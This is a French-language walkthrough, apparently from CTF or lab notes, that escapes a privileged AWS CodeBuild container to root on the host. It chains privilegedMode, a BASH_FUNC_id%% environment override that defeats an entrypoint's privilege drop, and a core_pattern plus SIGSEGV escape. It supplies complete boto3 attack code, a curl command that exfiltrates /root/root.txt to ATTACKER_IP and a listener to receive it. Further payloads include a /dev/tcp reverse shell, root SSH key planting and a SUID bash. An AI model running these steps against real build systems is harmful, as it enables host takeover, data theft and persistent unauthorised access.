# CodeBuild Privilégié + core\_pattern Escape

## <mark style="color:red;">CodeBuild Privilégié + core\_pattern Escape</mark>

### <mark style="color:blue;">Vue d'ensemble</mark>

Cette technique enchaîne trois mécanismes pour passer de `uid=1000` dans un container Docker non privilégié à **root sur l'hôte** :

```
uid=1000 (worker container)
    │
    ├─ [1] CodeBuild avec privilegedMode=true  → container --privileged
    ├─ [2] BASH_FUNC_id%%                      → reste root dans le container
    └─ [3] core_pattern + SIGSEGV              → exécution en root sur l'HÔTE
```

**Prérequis :**

* Accès à un service CodeBuild (AWS ou émulateur type LocalStack/floci)
* Capacité à créer un projet avec `privilegedMode: true`
* Une image Docker disponible avec un entrypoint bash (pour le bypass)

***

### <mark style="color:blue;">Étape 1 — Créer un projet CodeBuild privilégié</mark>

#### Pourquoi `privilegedMode: true` est dangereux

Un container CodeBuild normal est isolé. Avec `privilegedMode: true`, Docker lance le container avec le flag `--privileged`, ce qui lui donne :

* Accès à tous les devices du système
* `CapEff=0x1ffffffffff` (toutes les capabilities Linux)
* Accès en écriture à `/proc/sys/` du kernel hôte
* Capacité à monter des systèmes de fichiers

C'est conçu pour faire du "Docker dans Docker" mais ça ouvre une porte vers l'hôte.

#### Code Python (boto3)

```python
import boto3

cb = boto3.client(
    'codebuild',
    endpoint_url='http://floci:4566',   # endpoint LocalStack ou AWS réel
    aws_access_key_id='test',
    aws_secret_access_key='test',
    region_name='us-east-1'
)

cb.create_project(
    name='pwn',
    source={'type': 'NO_SOURCE'},
    artifacts={'type': 'NO_ARTIFACTS'},
    environment={
        'type': 'LINUX_CONTAINER',
        'image': 'floci/floci:latest',  # image disponible sur l'hôte
        'computeType': 'BUILD_GENERAL1_SMALL',
        'privilegedMode': True          # ← clé de l'escalade
    },
    serviceRole='arn:aws:iam::000000000000:role/service-role',
    logsConfig={'s3Logs': {'status': 'DISABLED'}}
)
```

***

### <mark style="color:blue;">Étape 2 — Bypass du drop de privilège (BASH\_FUNC\_id%%)</mark>

#### <mark style="color:green;">Le problème : l'entrypoint drop de root</mark>

Certaines images Docker ont un entrypoint qui vérifie si le process est root et le rétrograde vers un uid non privilégié avant de démarrer :

```bash
#!/bin/bash
# Entrypoint typique avec drop de privilège
if [ "$(id -u)" = "0" ]; then
    exec gosu 1001 "$@"   # drop root → uid 1001
fi
exec "$@"
```

Sans bypass : le container démarre `--privileged` donc root, mais l'entrypoint le rétrograde à uid 1001 **avant** d'exécuter les commandes du buildspec. Résultat : `permission denied` sur `/proc/sys/kernel/core_pattern`.

#### <mark style="color:green;">La technique : BASH\_FUNC\_id%%</mark>

En bash, une variable d'environnement dont le nom se termine par `%%` définit une **fonction bash exportée**. Quand le script appelle `id`, bash intercepte et exécute notre fonction à la place.

```
Variable d'env :  BASH_FUNC_id%% = () { echo uid=1000; }

Script entrypoint fait :  $(id -u)
Bash exécute notre fonction :  echo uid=1000
Résultat :  "uid=1000"

Test devient :  [ "uid=1000" = "0" ]  →  faux  →  drop ignoré  →  reste root ✓
```

#### <mark style="color:green;">Règle critique : passer la variable au bon moment</mark>

La variable doit être injectée dans l'**environnement du container au démarrage**, pas dans les commandes du buildspec. L'entrypoint s'exécute avant que le buildspec ne démarre — si on met `export BASH_FUNC_id%%=...` dans les commandes, c'est trop tard.

```python
cb.start_build(
    projectName='pwn',
    environmentVariablesOverride=[
        {
            'name': 'BASH_FUNC_id%%',           # variable d'env du container
            'value': '() { echo uid=1000; }',   # fonction bash qui remplace id
            'type': 'PLAINTEXT'
        }
    ],
    buildspecOverride=buildspec
)
```

#### <mark style="color:green;">Timeline de démarrage</mark>

```
Docker démarre le container
    │
    ├─ [ENV injectées ici, AVANT tout]  ← BASH_FUNC_id%% est là
    │
    └─ Entrypoint bash s'exécute
         │
         ├─ $(id -u) → appelle notre fonction → "uid=1000"
         ├─ [ "uid=1000" = "0" ] → faux → pas de gosu
         └─ Container reste root ✓
              │
              └─ Agent CodeBuild démarre
                   └─ Commandes du buildspec s'exécutent en root ✓
```

***

### <mark style="color:blue;">Étape 3 — Container escape via core\_pattern</mark>

#### <mark style="color:green;">Principe du core\_pattern</mark>

`/proc/sys/kernel/core_pattern` contrôle ce que Linux fait quand un processus crashe (segfault). Si la valeur commence par `|`, le kernel **exécute le programme indiqué en tant que root** sur l'hôte :

```bash
echo "|/chemin/vers/script.sh" > /proc/sys/kernel/core_pattern
```

Ce paramètre est **global** — il appartient au kernel hôte. Un container `--privileged` peut y écrire, et le changement affecte tout le système hôte.

#### 3.1 — Trouver l'upperdir de l'overlay

Le container utilise un système de fichiers overlay. La couche writable (`upperdir`) est un dossier sur le disque de l'hôte. Tout fichier écrit dans le container à `/x.sh` existe physiquement sur l'hôte à `$UDIR/x.sh`.

```bash
UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
# Exemple de résultat : /var/lib/docker/overlay2/abc123/diff
```

#### 3.2 — Écrire le script malveillant

```bash
printf '#!/bin/sh\ncat /root/root.txt | curl -s http://ATTACKER_IP:9999/ --data-binary @-\n' > /x.sh
chmod +x /x.sh
```

Dans le container, ce fichier est à `/x.sh`. Sur l'hôte, ce fichier est à `/var/lib/docker/overlay2/abc123/diff/x.sh`. Ce sont **le même fichier physique** — le kernel hôte peut l'atteindre via le chemin hôte.

#### 3.3 — Écrire core\_pattern et déclencher le crash

```bash
# Pointer le kernel vers notre script (chemin HÔTE)
echo "|${UDIR}/x.sh" > /proc/sys/kernel/core_pattern

# Déclencher un crash volontaire (SIGSEGV)
ulimit -c unlimited
bash -c 'kill -11 $$'
```

#### Ce qui se passe dans le kernel

```
bash -c 'kill -11 $$'
    │
    └─ Process bash reçoit SIGSEGV
         │
         └─ Kernel hôte intercepte le crash
              │
              └─ Lit /proc/sys/kernel/core_pattern
                   = "|/var/lib/docker/overlay2/abc123/diff/x.sh"
                   │
                   └─ Exécute le script en tant que UID 0 (root hôte)
                        │
                        └─ cat /root/root.txt | curl http://ATTACKER:9999/
                                                        │
                                                        ▼
                                                 Flag reçu sur Kali
```

***

### <mark style="color:blue;">Buildspec final complet (Python boto3)</mark>

```python
import boto3, time

ATTACKER_IP   = "10.10.15.X"   # ton IP VPN tun0
ATTACKER_PORT = "9999"

cb = boto3.client(
    'codebuild',
    endpoint_url='http://floci:4566',
    aws_access_key_id='test',
    aws_secret_access_key='test',
    region_name='us-east-1'
)

buildspec = f"""version: 0.2
phases:
  build:
    commands:
      - UDIR=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /proc/self/mountinfo | head -1)
      - printf '#!/bin/sh\\ncat /root/root.txt | curl -s http://{ATTACKER_IP}:{ATTACKER_PORT}/ --data-binary @-\\n' > /x.sh
      - chmod +x /x.sh
      - echo "|${{UDIR}}/x.sh" > /proc/sys/kernel/core_pattern
      - ulimit -c unlimited
      - bash -c 'kill -11 $$' || true
      - sleep 5
"""

resp = cb.start_build(
    projectName='pwn',
    environmentVariablesOverride=[
        {
            'name': 'BASH_FUNC_id%%',
            'value': '() { echo uid=1000; }',
            'type': 'PLAINTEXT'
        }
    ],
    buildspecOverride=buildspec
)

build_id = resp['build']['id']
print(f"[*] Build lancé : {build_id}")

# Attendre la fin
for i in range(40):
    time.sleep(3)
    r = cb.batch_get_builds(ids=[build_id])
    status = r['builds'][0]['buildStatus']
    phase  = r['builds'][0]['currentPhase']
    print(f"[{i*3}s] {phase} - {status}")
    if status in ('SUCCEEDED', 'FAILED', 'STOPPED'):
        break
```

### <mark style="color:blue;">Listener Kali pour récupérer le flag</mark>

```python
python3 -c "
import http.server

class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(n)
        print('\n=== ROOT FLAG ===')
        print(body.decode(errors='replace'))
        print('=================')
        self.send_response(200)
        self.end_headers()
    def log_message(self, *a): pass

http.server.HTTPServer(('0.0.0.0', 9999), H).serve_forever()
"
```

> **Important** : lancer le listener **avant** de lancer le build.

***

### Pourquoi utiliser curl et pas un fichier intermédiaire

La tentation est d'écrire le flag dans un fichier et de le lire depuis le worker. Ça ne fonctionne pas pour deux raisons :

**Raison 1 — containers séparés :** le fichier écrit par `x.sh` atterrit dans l'upperdir du container CodeBuild. Le worker est dans un container différent avec son propre overlay. Les deux overlays sont isolés l'un de l'autre.

**Raison 2 — pas de canal de sortie :** `x.sh` s'exécute du côté du kernel hôte, dans un contexte complètement séparé du container CodeBuild et du worker. Il n'a aucun moyen de "retourner" une valeur vers ces containers. `curl` crée un canal de sortie direct vers l'attaquant, contournant ce problème.

***

### Erreurs fréquentes et fixes

| Symptôme                                         | Cause                                         | Fix                                                                                           |
| ------------------------------------------------ | --------------------------------------------- | --------------------------------------------------------------------------------------------- |
| Build dure 0 seconde, logs vides                 | Buildspec malformé (escapes shell)            | Utiliser Python boto3, pas le CLI                                                             |
| `permission denied` sur `core_pattern`           | Entrypoint a drop root avant buildspec        | Vérifier que `BASH_FUNC_id%%` est dans `environmentVariablesOverride`, pas dans les commandes |
| `BASH_FUNC_id%%` dans les commandes du buildspec | Trop tard, drop déjà effectué                 | Passer via `environmentVariablesOverride` au `start_build`                                    |
| Flag ne revient pas, build SUCCEEDED             | `python3 -m http.server` ne supporte pas POST | Utiliser le listener Python custom avec `do_POST`                                             |
| `rf` introuvable dans `/tmp` du worker           | Fichier dans l'overlay du mauvais container   | Exfiltrer via `curl` dans `x.sh`, pas via fichier partagé                                     |

***

### Variantes de core\_pattern

Si `curl` n'est pas disponible dans le contexte d'exécution de `x.sh` :

```bash
# Copier le flag dans l'upperdir (visible depuis le container)
printf '#!/bin/sh\ncat /root/root.txt > %s/flag.txt\n' "$UDIR" > /x.sh

# Créer un reverse shell vers l'attaquant
printf '#!/bin/sh\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n' > /x.sh

# Ajouter une clé SSH root
printf '#!/bin/sh\necho "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys\n' > /x.sh

# Copier bash avec bit SUID
printf '#!/bin/sh\ncp /bin/bash /tmp/bash && chmod +s /tmp/bash\n' > /x.sh
```

***

### Checklist rapide

```
[ ] Accès à CodeBuild (LocalStack ou AWS)
[ ] create_project avec privilegedMode=true
[ ] Lancer listener (python3 custom avec do_POST) sur port 9999
[ ] start_build avec BASH_FUNC_id%% dans environmentVariablesOverride
[ ] Vérifier que le build dure > 3 secondes (sinon buildspec malformé)
[ ] Flag reçu sur le listener
```
